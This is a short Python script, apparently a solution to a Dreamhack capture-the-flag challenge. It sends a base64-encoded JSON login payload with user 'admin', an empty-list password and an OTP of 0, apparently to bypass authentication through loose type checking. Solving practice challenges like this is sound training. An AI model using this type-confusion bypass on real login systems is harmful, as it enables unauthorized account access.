import requests
import json
import base64

url = 'http://host3.dreamhack.games:20751/'
payload = {
    "id": "admin",
    "pw": [],
    "otp": 0
}
data = {'cred': base64.b64encode(json.dumps(payload).encode()).decode()}
resp = requests.post(url, data=data)
print(resp.text)